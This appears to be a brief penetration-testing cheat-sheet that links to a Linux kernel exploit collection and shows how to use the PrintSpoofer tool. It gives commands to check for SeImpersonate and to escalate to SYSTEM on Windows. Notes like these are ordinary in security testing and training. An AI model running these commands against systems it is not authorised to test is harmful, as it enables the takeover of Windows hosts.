# Links

[Linux-Kernel-Exploits](https://github.com/SecWiki/linux-kernel-exploits)

# Windows Privilege Escalation Tools

## PrintSpoofer.exe
- Tested on Windows 10
- Uses NamedPipes and SeImpersonate to gain SYSTEM level priviledges - LPE
```bash
# Check for SeImpersonate
whoami /priv
# Execute LPE
PrintSpoofer.exe -i -c cmd
```
